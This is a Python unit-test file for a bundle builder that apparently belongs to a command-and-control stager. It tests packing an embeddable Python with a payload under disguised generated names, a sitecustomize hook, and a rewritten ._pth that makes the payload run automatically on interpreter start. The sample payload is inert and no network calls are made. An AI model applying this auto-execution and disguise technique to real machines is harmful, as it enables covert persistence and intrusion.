#!/usr/bin/env python3
"""Unit tests for the brought-interpreter bundle builder.

Four things these tests are careful about.

**The fixture is a fabricated distribution, not the real one.** The
official Windows embeddable zip is about 11 MB and has no business in a
repository; what matters about it is its *shape* -- an executable, some
DLLs, the stdlib zip, and a `python<XY>._pth` whose `import site` line is
commented out -- and that shape fits in a few hundred bytes. The members
are written in an unsorted order on purpose, so a builder that merely
copied the source order could not pass the reproducibility test.

**The hash check is tested for its position, not only its outcome.** A
tool that unzips first and verifies afterwards has already parsed
attacker-controlled input, and a test that only asserts "a bad hash
raises" cannot tell the two apart. So `zipfile.ZipFile` is replaced with
something that raises, and a mismatching hash must still come back as
the refusal; a control test with the matching hash requires the same
replacement to be reached, so the probe is not blind.

**Reproducibility is measured across two builds, not against one.** The
second build reads inputs at different paths, written with different
internal timestamps and different file mtimes, and runs with `time`
patched a year forward -- which is what catches a builder that stamps
entries with the clock, the one defect a same-second rebuild would miss.

**Nothing here reaches a network, and the module may not be able to.**
The design's scope is build locally, upload by hand: no route builds or
publishes a bundle and the tool knows no location. That is held two
ways -- the module's own imports are read with `ast`, and one build runs
with `socket` sabotaged.

No test writes outside a `TemporaryDirectory`.
"""

import ast
import hashlib
import io
import json
import os
import posixpath
import socket
import time
import unittest
import zipfile
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

from software.c2.stagers.startup_hook import render_sitecustomize
from tools import build_interpreter_bundle as builder

# A plausible pair of generated names, of the shape the server mints.
# Written here rather than taken from the generator so a generator that
# stopped generating could not make these tests agree with it.
_BASE_DIR = "support4f2a"
_PAYLOAD_NAME = "runtime9c21.py"
_PAYLOAD = b"# the delivered artifact\nimport sys\nsys.exit(0)\n"

# The `._pth` the official embeddable distribution ships: two path lines,
# and the one line that would make `site` run, commented out. CRLF,
# because that is what comes out of the published zip.
_PTH_NAME = "python311._pth"
_PTH_AS_SHIPPED = ("python311.zip\r\n"
                   ".\r\n"
                   "\r\n"
                   "# Uncomment to run site.main() automatically\r\n"
                   "#import site\r\n")

# Deliberately not in sorted order.
_DISTRIBUTION = {
    "python.exe": b"MZ\x90 python.exe",
    "python311.zip": b"PK\x03\x04 the stdlib",
    "LICENSE.txt": b"PSF LICENSE AGREEMENT",
    _PTH_NAME: _PTH_AS_SHIPPED.encode("ascii"),
    "pythonw.exe": b"MZ\x90 pythonw.exe",
    "python311.dll": b"MZ\x90 python311",
    "libcrypto-3.dll": b"MZ\x90 libcrypto",
    "python3.dll": b"MZ\x90 python3",
}

# Everything a module would have to import to put bytes on a wire, or to
# ask something else to. `subprocess` is in the list because shelling out
# to a transfer tool is an upload too.
_NETWORK_MODULES = frozenset({
    "asyncio", "boto3", "botocore", "ftplib", "http", "httplib2",
    "imaplib", "paramiko", "poplib", "requests", "smtplib", "socket",
    "socketserver", "ssl", "telnetlib", "urllib", "urllib3",
    "webbrowser", "wsgiref", "xmlrpc", "subprocess",
})


def _write_distribution(path, members=None, date_time=(2024, 6, 1, 12, 0, 0),
                        mode=0o755, extra=b""):
    """A fabricated zip with the embeddable distribution's shape.

    `date_time`, `mode` and `extra` exist so the reproducibility test can
    hand the second build a source archive whose per-entry metadata is
    entirely different -- none of it may reach the output.
    """
    members = _DISTRIBUTION if members is None else members
    with zipfile.ZipFile(str(path), "w", zipfile.ZIP_DEFLATED) as out:
        for name in members:
            info = zipfile.ZipInfo(name, date_time=date_time)
            info.create_system = 0
            info.external_attr = mode << 16
            info.extra = extra
            out.writestr(info, members[name])


def _sha256(path):
    return hashlib.sha256(Path(str(path)).read_bytes()).hexdigest()


class _BundleCase(unittest.TestCase):
    """A fabricated distribution, a payload, and somewhere to write."""

    def setUp(self):
        tmp = TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)
        self.distribution = self.tmp / "python-embed-amd64.zip"
        _write_distribution(self.distribution)
        self.payload = self.tmp / "artifact.py"
        self.payload.write_bytes(_PAYLOAD)
        self.out = self.tmp / "bundle.zip"

    def build(self, **overrides):
        """`build_bundle` over the fixture, with the right hash by default."""
        distribution = overrides.pop("distribution", str(self.distribution))
        payload = overrides.pop("payload_source", str(self.payload))
        kwargs = {"base_dir": _BASE_DIR, "payload_name": _PAYLOAD_NAME,
                  "gate": "path", "out_path": str(self.out),
                  "expect_sha256": _sha256(self.distribution)}
        kwargs.update(overrides)
        return builder.build_bundle(distribution, payload, **kwargs)

    def cli(self, *extra, **overrides):
        """`main` over the fixture; returns (exit code, stdout, stderr)."""
        if "expect_sha256" in overrides:
            pinned = overrides["expect_sha256"]
        else:
            pinned = _sha256(self.distribution)
        argv = ["--distribution", str(self.distribution),
                "--expect-sha256", pinned,
                "--payload", str(self.payload),
                "--payload-name", _PAYLOAD_NAME,
                "--base-dir", _BASE_DIR,
                "--out", str(self.out)]
        argv.extend(extra)
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = builder.main(argv)
        return code, out.getvalue(), err.getvalue()

    def members(self, path=None):
        """The built archive as {name: bytes}."""
        with zipfile.ZipFile(str(path or self.out)) as archive:
            return {info.filename: archive.read(info.filename)
                    for info in archive.infolist()}

    def with_pth(self, text, name=_PTH_NAME):
        """A distribution whose `._pth` is `text` under `name`."""
        members = {key: value for key, value in _DISTRIBUTION.items()
                   if key != _PTH_NAME}
        if text is not None:
            members[name] = text.encode("ascii")
        path = self.tmp / "variant.zip"
        _write_distribution(path, members)
        return {"distribution": str(path), "expect_sha256": _sha256(path)}


class TestTheDistributionIsVerifiedBeforeItIsOpened(_BundleCase):
    """The pinned hash, and that it is checked while the file is closed."""

    def test_a_distribution_whose_hash_does_not_match_is_refused(self):
        wrong = "0" * 64
        with self.assertRaises(ValueError) as raised:
            self.build(expect_sha256=wrong)

        message = str(raised.exception)
        self.assertIn(wrong, message, message)
        self.assertIn(_sha256(self.distribution), message, message)
        self.assertIn("python-embed-amd64.zip", message, message)
        self.assertFalse(self.out.exists(),
                         "a refused distribution still produced a bundle")

    def test_the_zip_is_not_opened_until_the_hash_matches(self):
        # Position, not outcome: with the zip module sabotaged, a
        # mismatching hash must still come back as the refusal.
        def never(*args, **kwargs):
            raise AssertionError("the distribution was opened unverified")

        with mock.patch.object(builder.zipfile, "ZipFile", never):
            with self.assertRaises(ValueError):
                self.build(expect_sha256="0" * 64)

    def test_the_same_probe_is_reached_when_the_hash_does_match(self):
        # The control for the test above. Without it, a builder that
        # never opened a zip at all would pass that one.
        def never(*args, **kwargs):
            raise AssertionError("reached")

        with mock.patch.object(builder.zipfile, "ZipFile", never):
            with self.assertRaises(AssertionError):
                self.build()

    def test_a_truncated_distribution_is_refused(self):
        # What a half-finished download looks like: the operator has the
        # published hash, the bytes on disk are not those bytes.
        pinned = _sha256(self.distribution)
        whole = self.distribution.read_bytes()
        self.distribution.write_bytes(whole[:len(whole) // 2])

        with self.assertRaises(ValueError):
            self.build(expect_sha256=pinned)
        self.assertFalse(self.out.exists())

    def test_a_hash_that_is_not_a_sha256_is_refused_as_such(self):
        for bad in ("", "deadbeef", "z" * 64, "ABC"):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    self.build(expect_sha256=bad)

    def test_an_earlier_bundle_is_not_truncated_by_a_refused_build(self):
        self.out.write_bytes(b"the bundle from the last good build")
        with self.assertRaises(ValueError):
            self.build(expect_sha256="0" * 64)
        self.assertEqual(self.out.read_bytes(),
                         b"the bundle from the last good build")


class TestTheLayoutTheHookNeeds(_BundleCase):
    """Where the two generated files land, and why it has to be there."""

    def test_sitecustomize_lands_under_Lib(self):
        self.build()
        self.assertIn("%s/Lib/sitecustomize.py" % _BASE_DIR, self.members())

    def test_the_hook_is_the_renderers_own_text(self):
        self.build()
        hook = self.members()["%s/Lib/sitecustomize.py" % _BASE_DIR]
        self.assertEqual(hook.decode("utf-8"),
                         render_sitecustomize(_PAYLOAD_NAME, "path"))

    def test_the_gate_reaches_the_hook(self):
        self.build(gate="argc")
        hook = self.members()["%s/Lib/sitecustomize.py" % _BASE_DIR]
        self.assertEqual(hook.decode("utf-8"),
                         render_sitecustomize(_PAYLOAD_NAME, "argc"))

    def test_the_payload_lands_under_the_generated_name(self):
        self.build()
        names = self.members()
        self.assertIn("%s/%s" % (_BASE_DIR, _PAYLOAD_NAME), names)
        self.assertEqual(names["%s/%s" % (_BASE_DIR, _PAYLOAD_NAME)], _PAYLOAD)
        self.assertNotIn("%s/%s" % (_BASE_DIR, self.payload.name), names,
                         "the payload kept the name it had on the operator's "
                         "disk instead of the build's")

    def test_the_payload_sits_where_the_hook_will_look_for_it(self):
        # The hook walks two dirname levels up from its own __file__, so
        # the payload must be one level above `Lib/` -- beside the
        # executable. Derived from the archive rather than asserted as a
        # string, because this is the property, not the spelling.
        self.build()
        names = self.members()
        hook = [name for name in names
                if name.endswith("/Lib/sitecustomize.py")][0]
        payload = [name for name in names
                   if name.endswith("/" + _PAYLOAD_NAME)][0]
        root = posixpath.dirname(posixpath.dirname(hook))
        self.assertEqual(posixpath.dirname(payload), root)
        self.assertIn("%s/python.exe" % root, names,
                      "the payload is not beside the executable")

    def test_the_payload_keeps_its_own_name_when_none_is_given(self):
        self.build(payload_name=None)
        self.assertIn("%s/%s" % (_BASE_DIR, self.payload.name),
                      self.members())

    def test_the_distribution_is_carried_over_unchanged(self):
        self.build()
        names = self.members()
        for name, data in _DISTRIBUTION.items():
            if name == _PTH_NAME:
                continue
            with self.subTest(name=name):
                self.assertEqual(names["%s/%s" % (_BASE_DIR, name)], data)

    def test_the_archive_has_one_top_level_directory_and_it_is_the_base(self):
        self.build()
        tops = {name.split("/")[0] for name in self.members()}
        self.assertEqual(tops, {_BASE_DIR})

    def test_a_base_dir_that_is_not_a_plain_name_is_refused(self):
        for bad in ("", "..", "a/b", "/abs", "../escape", ".hidden"):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    self.build(base_dir=bad)

    def test_a_payload_name_the_hook_could_not_join_is_refused(self):
        for bad in ("../escape.py", "sub/dir.py", "quote'.py"):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    self.build(payload_name=bad)
        self.assertFalse(self.out.exists())

    def test_a_gate_nobody_implements_is_refused(self):
        with self.assertRaises(ValueError):
            self.build(gate="sideload")

    def test_a_member_that_would_escape_the_layout_is_refused(self):
        members = dict(_DISTRIBUTION)
        members["../elsewhere.dll"] = b"MZ"
        path = self.tmp / "escaping.zip"
        _write_distribution(path, members)

        with self.assertRaises(ValueError) as raised:
            self.build(distribution=str(path), expect_sha256=_sha256(path))
        self.assertIn("elsewhere", str(raised.exception))

    def test_a_distribution_that_already_carries_the_hook_is_refused(self):
        members = dict(_DISTRIBUTION)
        members["Lib/sitecustomize.py"] = b"# somebody got here first\n"
        path = self.tmp / "occupied.zip"
        _write_distribution(path, members)

        with self.assertRaises(ValueError) as raised:
            self.build(distribution=str(path), expect_sha256=_sha256(path))
        self.assertIn("sitecustomize", str(raised.exception))


class TestThePthIsRewrittenAndItsShapeIsChecked(_BundleCase):
    """The file that decides whether any of this runs at all."""

    def pth(self, path=None):
        return self.members(path)[
            "%s/%s" % (_BASE_DIR, _PTH_NAME)].decode("ascii")

    def test_the_pth_gains_import_site(self):
        self.build()
        lines = [line.strip() for line in self.pth().splitlines()]
        self.assertIn("import site", lines, self.pth())
        self.assertFalse([line for line in lines
                          if line.startswith("#")
                          and line.lstrip("#").strip() == "import site"],
                         "the commented line is still there, so `site` would "
                         "run only if something else uncommented it")

    def test_the_pth_puts_the_hooks_directory_on_the_path(self):
        # An `._pth` replaces sys.path wholesale. The distribution's own
        # lists only the stdlib zip and the interpreter root, so `site`
        # would import `sitecustomize` from the root and never look in
        # `Lib/` -- the hook would be present and never imported.
        self.build()
        lines = [line.strip() for line in self.pth().splitlines()]
        self.assertIn("Lib", lines, self.pth())

    def test_the_distributions_own_path_lines_survive(self):
        self.build()
        lines = [line.strip() for line in self.pth().splitlines()]
        self.assertIn("python311.zip", lines, self.pth())
        self.assertIn(".", lines, self.pth())

    def test_a_pth_that_already_imports_site_is_left_as_it_is(self):
        text = "python311.zip\r\n.\r\nLib\r\nimport site\r\n"
        self.build(**self.with_pth(text))
        self.assertEqual(self.pth(), text)

    def test_a_pth_that_does_not_mention_import_site_is_refused(self):
        text = "python311.zip\r\n.\r\n"
        with self.assertRaises(ValueError) as raised:
            self.build(**self.with_pth(text))

        message = str(raised.exception)
        self.assertIn(_PTH_NAME, message,
                      "the refusal does not name the file it looked at")
        self.assertIn("python311.zip", message,
                      "the refusal does not say what it found instead")
        self.assertIn("import site", message, message)
        self.assertFalse(self.out.exists(),
                         "an unrecognised ._pth still produced a bundle")

    def test_a_distribution_with_no_pth_is_refused(self):
        with self.assertRaises(ValueError) as raised:
            self.build(**self.with_pth(None))
        self.assertIn("_pth", str(raised.exception))

    def test_a_distribution_with_two_pth_files_is_refused(self):
        members = dict(_DISTRIBUTION)
        members["python312._pth"] = _PTH_AS_SHIPPED.encode("ascii")
        path = self.tmp / "two.zip"
        _write_distribution(path, members)

        with self.assertRaises(ValueError) as raised:
            self.build(distribution=str(path), expect_sha256=_sha256(path))
        message = str(raised.exception)
        self.assertIn(_PTH_NAME, message)
        self.assertIn("python312._pth", message)

    def test_the_line_endings_the_distribution_used_are_kept(self):
        self.build()
        self.assertIn("\r\n", self.pth(),
                      "a CRLF ._pth came back with its line endings changed")
        self.build(**self.with_pth("python311.zip\n.\n#import site\n"))
        self.assertNotIn("\r", self.pth())


class TestWhatTheOperatorPastes(_BundleCase):
    """The printed entry, which is the whole of this tool's output."""

    def test_the_bundle_hash_is_printed_as_a_pasteable_entry(self):
        code, out, err = self.cli()
        self.assertEqual(code, 0, out + err)

        pasteable = [line for line in out.splitlines()
                     if line.strip().startswith("{")]
        self.assertEqual(len(pasteable), 1, out)
        entry = json.loads(pasteable[0])
        self.assertEqual(sorted(entry), ["sha256", "url"])
        self.assertEqual(entry["sha256"], _sha256(self.out),
                         "the printed hash is not the hash of the file it "
                         "wrote, so the stager would refuse the bundle")

    def test_the_entry_names_no_location_for_anyone_to_trust(self):
        # It uploads nothing, so it cannot know where the file went: the
        # url is a placeholder the operator replaces.
        entry = json.loads(self.build()["entry"])
        self.assertNotIn("://", entry["url"], entry)
        self.assertTrue(entry["url"], entry)

    def test_the_returned_dict_and_the_printed_entry_agree(self):
        code, out, _err = self.cli()
        self.assertEqual(code, 0, out)
        printed = [line.strip() for line in out.splitlines()
                   if line.strip().startswith("{")][0]
        self.out.unlink()
        result = self.build()
        self.assertEqual(result["entry"], printed)
        self.assertEqual(sorted(result), ["entry", "path", "sha256"])
        self.assertEqual(result["path"], str(self.out))
        self.assertEqual(result["sha256"], _sha256(self.out))

    def test_the_pinned_distribution_hash_is_reported_too(self):
        # The drop entry is {url, sha256} and nothing else, per the type
        # the stager consumes -- so the version pin the operator has to
        # record alongside it is printed outside the JSON.
        _code, out, _err = self.cli()
        self.assertIn(_sha256(self.distribution), out)

    def test_the_cli_refuses_a_mismatching_hash_without_writing(self):
        code, out, err = self.cli(expect_sha256="0" * 64)
        self.assertNotEqual(code, 0)
        self.assertIn("0" * 64, out + err)
        self.assertFalse(self.out.exists())

    def test_the_cli_reports_a_missing_distribution_rather_than_tracing(self):
        pinned = _sha256(self.distribution)
        self.distribution.unlink()
        code, out, err = self.cli(expect_sha256=pinned)
        self.assertNotEqual(code, 0)
        self.assertIn("python-embed-amd64.zip", out + err)


class TestTwoOperatorsCanCompareHashes(_BundleCase):
    """Reproducibility, which is the only cross-check the operator has."""

    def second_build(self):
        """The same inputs, elsewhere, with everything incidental changed.

        A different directory, a different name on disk, different file
        mtimes, different timestamps, modes and extra fields inside the
        source zip, its members written in the opposite order, and `time`
        patched a year forward -- which is the one that catches a builder
        stamping entries from the clock, as a same-second rebuild would
        not.
        """
        elsewhere = self.tmp / "again"
        elsewhere.mkdir()
        distribution = elsewhere / "downloaded-again.zip"
        reversed_members = {name: _DISTRIBUTION[name]
                            for name in reversed(list(_DISTRIBUTION))}
        _write_distribution(distribution, reversed_members,
                            date_time=(1999, 12, 31, 23, 59, 58),
                            mode=0o600, extra=b"ux\x0b\x00\x01\x04\xe8\x03"
                                               b"\x00\x00\x04\xe8\x03\x00\x00")
        payload = elsewhere / "a-different-local-name.py"
        payload.write_bytes(_PAYLOAD)
        os.utime(str(payload), (86400, 86400))
        out = elsewhere / "bundle-again.zip"

        later = time.localtime(time.time() + 365 * 24 * 3600)
        stamp = time.mktime(later)
        with mock.patch.object(time, "localtime", return_value=later), \
                mock.patch.object(time, "time", return_value=stamp):
            return builder.build_bundle(
                str(distribution), str(payload), base_dir=_BASE_DIR,
                payload_name=_PAYLOAD_NAME, gate="path", out_path=str(out),
                expect_sha256=_sha256(distribution))

    def test_rebuilding_with_the_same_inputs_gives_the_same_hash(self):
        first = self.build()
        second = self.second_build()

        self.assertNotEqual(first["path"], second["path"],
                            "the two builds wrote to the same file, so this "
                            "compares one build against itself")
        self.assertEqual(first["sha256"], second["sha256"])
        self.assertEqual(_sha256(first["path"]), _sha256(second["path"]))

    def test_the_hash_is_not_simply_constant(self):
        # The guard on the test above: a builder that wrote an empty zip
        # every time would satisfy it.
        first = self.build()
        self.payload.write_bytes(_PAYLOAD + b"# one more line\n")
        self.out = self.tmp / "other.zip"
        self.assertNotEqual(first["sha256"], self.build()["sha256"])

    def test_the_entries_are_sorted_rather_than_in_the_sources_order(self):
        self.build()
        names = list(self.members())
        self.assertEqual(names, sorted(names))
        carried = [name.split("/", 1)[1] for name in names
                   if name.count("/") == 1]
        self.assertNotEqual(carried, list(_DISTRIBUTION),
                            "the archive carries the source's member order, "
                            "so two zips of the same files would differ")

    def test_no_directory_entries_are_written(self):
        # A directory entry carries a timestamp and a mode of its own and
        # nothing else; every directory here is implied by the files in
        # it, so there are none to vary.
        self.build()
        with zipfile.ZipFile(str(self.out)) as archive:
            self.assertEqual([info.filename for info in archive.infolist()
                              if info.is_dir()], [])


class TestItUploadsNothing(_BundleCase):
    """The scope the design chose: build locally, upload by hand."""

    def test_no_upload_is_attempted(self):
        source = Path(builder.__file__).read_text(encoding="utf-8")
        imported = set()
        for node in ast.walk(ast.parse(source)):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imported.add(alias.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom) and node.module:
                imported.add(node.module.split(".")[0])

        self.assertEqual(sorted(imported & _NETWORK_MODULES), [],
                         "the builder imports something that could move "
                         "bytes off this machine; the design's scope is "
                         "build locally, upload by hand")
        self.assertNotIn("://", source,
                         "the builder names a location, and it is supposed "
                         "to know none")

    def test_a_build_completes_with_sockets_sabotaged(self):
        def refuse(*args, **kwargs):
            raise AssertionError("the builder reached for a network")

        with mock.patch.object(socket, "socket", refuse), \
                mock.patch.object(socket, "create_connection", refuse), \
                mock.patch.object(socket, "getaddrinfo", refuse):
            result = self.build()
        self.assertTrue(Path(result["path"]).is_file())


if __name__ == "__main__":
    unittest.main()
